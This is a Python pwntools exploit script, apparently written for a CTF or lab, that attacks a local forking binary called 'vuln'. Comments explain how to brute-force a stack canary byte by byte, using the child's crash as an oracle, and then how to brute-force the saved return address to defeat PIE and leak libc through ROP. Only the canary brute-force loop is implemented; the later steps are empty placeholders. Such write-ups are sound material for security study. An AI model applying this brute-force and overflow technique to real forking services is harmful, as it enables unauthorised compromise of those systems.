#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]
# context.terminal = ["tmux", "splitw", "-h"]

p = process("./vuln")
# p = gdb.debug("./vuln")

e = ELF("./vuln")

rop = ROP(e)

overflow_to_canary = 264
overflow_to_main = overflow_to_canary + 8 + 8
overflow_to_rip = overflow_to_canary + 8 + 8 + 8 + 8

# The vulnerable program forks a child where it calls `overflow`. This is
# important, since it means we can crash in the child and the parent keeps
# running.
#
# The "randomization", i.e. canary, PIE, ALSR, are "persistent" for the
# *current* invocation of the program (they don't change!). Also, these random
# values are copied to the child!
#
# So you can brute force these things. Partial leaks are very useful - you can
# reduce the search space significantly.
#
# In our case, we first have to bruteforce the canary, and then bruteforce the
# saved RIP to bypass PIE. After that, we can use a ROP chain to call `puts` via
# PLT/GOT leak to leak canary/LIBC's base address per normal.
#
# For the canary,
#
# 0xdf1279a1b2528700
#
# Since we overwrite from LSB to MSB, we can test our bytes one by one to
# confirm the current guess doesn't trigger the stack-smash crash (our oracle).
#
# ---
#
# With the canary value, let's try and brute force `overflow`'s return address
# to `main`. Here are some example return addresses for `main+44`:
#
# 0x5584f3223220
# 0x56435ae5d220
# 0x5653ae665220
# 0x55dc08f44220
# 0x556d06dcd220
#
# Observation: The MSB changes when the following 3 bytes and 1 nibble overflow,
# so there's no need to brute force the MSB.
#
# The following 3 bytes (24 bits) and 1 nibble (4 bits) make up *28* bits of
# entropy to brute force.
#
# This matches my Linux Kernel's configuration:
#
# ```sh
# $ sudo cat /proc/sys/vm/mmap_rnd_bits
# 28
# ```
#
# That's a search space of 256 * 256 * 256 * 16 = *268,435,456*.
#
# So we bruteforce saved RIP one byte at a time :).
#
# We can use a crash as an oracle - if the target doesn't crash, we've found the
# correct target base address.


# 1 - Bruteforce the canary value.
# Since we can overwrite part of the

payload = b"A" * overflow_to_canary

found_canary = b"\x00"
for _ in range(7):
    for j in range(256):
        tmp_payload = payload + found_canary + bytes([j])
        p.sendafter(b"Hey, whats your name!?\n\n", tmp_payload)

        resp = p.recvline()

        if b"stack smashing detected" in resp:
            debug("trying again...")
        elif b"Thanks!" in resp:
            found_canary += bytes([j])
            break

print("canary found = ", hex(u64(found_canary)))
pause()

# 2 - Brute force `overflow`'s return address (saved RIP).

# 3 - Leak libc's address to default ALSR

# p.interactive()
